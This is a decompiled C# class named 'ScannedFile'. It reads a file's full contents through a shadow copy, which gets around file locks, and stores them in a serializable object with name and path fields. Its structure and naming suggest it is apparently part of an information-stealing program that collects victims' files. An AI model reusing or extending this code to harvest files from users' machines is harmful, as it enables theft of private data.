using System;
using System.IO;
using System.Runtime.Serialization;

// Token: 0x02000052 RID: 82
[DataContract(Name = "ScannedFile", Namespace = "BrowserExtension")]
public class ScannedFile
{
	// Token: 0x0600019D RID: 413 RVA: 0x00002E64 File Offset: 0x00001064
	public ScannedFile()
	{
	}

	// Token: 0x0600019E RID: 414 RVA: 0x00009EB4 File Offset: 0x000080B4
	public ScannedFile(string filename)
	{
		this.NameOfFile = new FileInfo(filename).Name;
		using (FileCopier fileCopier = new FileCopier())
		{
			this.Body = File.ReadAllBytes(fileCopier.CreateShadowCopy(filename));
		}
	}

	// Token: 0x17000048 RID: 72
	// (get) Token: 0x0600019F RID: 415 RVA: 0x00009F0C File Offset: 0x0000810C
	// (set) Token: 0x060001A0 RID: 416 RVA: 0x00009F14 File Offset: 0x00008114
	[DataMember(Name = "PathOfFile")]
	public string PathOfFile { get; set; }

	// Token: 0x17000049 RID: 73
	// (get) Token: 0x060001A1 RID: 417 RVA: 0x00009F1D File Offset: 0x0000811D
	// (set) Token: 0x060001A2 RID: 418 RVA: 0x00009F25 File Offset: 0x00008125
	[DataMember(Name = "NameOfFile")]
	public string NameOfFile { get; set; }

	// Token: 0x1700004A RID: 74
	// (get) Token: 0x060001A3 RID: 419 RVA: 0x00009F2E File Offset: 0x0000812E
	// (set) Token: 0x060001A4 RID: 420 RVA: 0x00009F36 File Offset: 0x00008136
	[DataMember(Name = "Body")]
	public byte[] Body { get; set; }

	// Token: 0x1700004B RID: 75
	// (get) Token: 0x060001A5 RID: 421 RVA: 0x00009F3F File Offset: 0x0000813F
	// (set) Token: 0x060001A6 RID: 422 RVA: 0x00009F47 File Offset: 0x00008147
	[DataMember(Name = "NameOfApplication")]
	public string NameOfApplication { get; set; }

	// Token: 0x1700004C RID: 76
	// (get) Token: 0x060001A7 RID: 423 RVA: 0x00009F50 File Offset: 0x00008150
	// (set) Token: 0x060001A8 RID: 424 RVA: 0x00009F58 File Offset: 0x00008158
	[DataMember(Name = "DirOfFile")]
	public string DirOfFile { get; set; }
}
